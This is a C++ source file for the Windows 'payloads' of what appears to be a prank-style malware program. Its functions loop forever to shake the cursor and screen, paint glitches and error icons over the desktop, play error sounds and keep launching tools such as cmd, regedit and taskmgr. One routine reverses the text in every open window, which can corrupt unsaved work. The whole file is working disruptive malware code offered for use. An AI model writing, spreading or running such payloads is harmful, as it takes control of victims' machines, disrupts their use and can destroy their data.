#include "Payloads.h"
#include <Windows.h>
#include <atomic>

int ScrW = GetSystemMetrics(0);
int ScrH = GetSystemMetrics(1);
HWND hwnd = GetDesktopWindow();


std::atomic<bool> Payloads::ScreenShakeStop(false);



void Payloads::MouseShake() {
	POINT cursor;

	while (true) {	
		GetCursorPos(&cursor);
		SetCursorPos(cursor.x + (rand() % 3 - 1), cursor.y + (rand() % 3 - 1));
		Sleep(10);
	}
}

void Payloads::ScreenShake() {
	HDC hdc;
	while (!ScreenShakeStop) {
		hdc = GetWindowDC(0);
		BitBlt(hdc, rand() % 4, rand() % 4, ScrW, ScrH, hdc, rand() % 4, rand() % 4, SRCCOPY);
		Sleep(10);
		ReleaseDC(0, hdc);
	}
}

BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
	LPWSTR str = (LPWSTR)GlobalAlloc(GMEM_ZEROINIT, sizeof(WCHAR) * 8192);
	if (SendMessageTimeoutW(hwnd, WM_GETTEXT, 8192, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL)) {
		int len = lstrlenW(str);
		if (len > 1) {
			WCHAR c;
			int i, j;
			for (i = 0, j = len - 1; i < j; i++, j--) {
				c = str[i];
				str[i] = str[j];
				str[j] = c;
			}
			for (i = 0; i < len - 1; i++) {
				if (str[i] == L'\n' && str[i + 1] == L'\r') {
					str[i] = L'\r';
					str[i + 1] = L'\n';
				}
			}
			SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL);
		}
	}
	GlobalFree(str);
	return TRUE;
}

void Payloads::ReverseText() {
	while (true) {
		EnumChildWindows(hwnd, &EnumChildProc, NULL);
		Sleep(10);
	}
}


void Payloads::RandomErrors() {
	HDC hdc;
	while (true) {
		int ix = GetSystemMetrics(SM_CXICON) / 2;
		int iy = GetSystemMetrics(SM_CYICON) / 2;
		hdc = GetWindowDC(hwnd);
		if (rand() % (int)(10 / (1 / 500.0 + 1) + 1) == 0) {
			DrawIcon(hdc, rand() % ScrW, rand() % ScrH, LoadIcon(NULL, IDI_ERROR));
			PlaySoundA("SystemError", GetModuleHandle(NULL), SND_ASYNC);
		}
		ReleaseDC(hwnd, hdc);
		Sleep(10);
	}
}


void Payloads::DisplayBugs() {
	HDC hdc;
	while (true) {
		hdc = GetWindowDC(hwnd);
		BitBlt(hdc, rand() % 666, rand() % 666, ScrW, ScrH, hdc, rand() % 666, rand() % 666, NOTSRCERASE);
		Sleep(500);
		ReleaseDC(0, hdc);
	}
}


void Payloads::DisplayArtifacts() {
	HDC hdc;
	while (true) {
		hdc = GetWindowDC(hwnd);
		HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
		SelectObject(hdc, brush);
		if (rand() % 2) BitBlt(hdc, 0, 0, ScrW, ScrH, hdc, -30, 0, 0x1900ac010e);
		if (rand() % 2) BitBlt(hdc, 0, 0, ScrW, ScrH, hdc, ScrW - 30, 0, 0x1900ac010e);
		if (rand() % 2) BitBlt(hdc, 0, 0, ScrW, ScrH, hdc, 0, -30, 0x1900ac010e);
		if (rand() % 2) BitBlt(hdc, 0, 0, ScrW, ScrH, hdc, 0, ScrH - 30, 0x1900ac010e);
		DeleteObject(brush);
		ReleaseDC(0, hdc);
		Sleep(rand() % 5000 + 2000);
	}
}

const char* files[] = {
	"calc",
	"notepad",
	"cmd",
	"regedit",
	"explorer",
	"taskmgr",
	"mspaint",
	"devmgmt.msc",
	"control",
};

void Payloads::OpenRandomApps() {
	int nFiles = sizeof(files) / sizeof(void*);
	while (true) {
		ShellExecuteA(NULL, "open", (LPCSTR)files[rand() % nFiles], NULL, NULL, SW_SHOWDEFAULT);
		Sleep(rand() & 5000 + 1000);
	}	
}

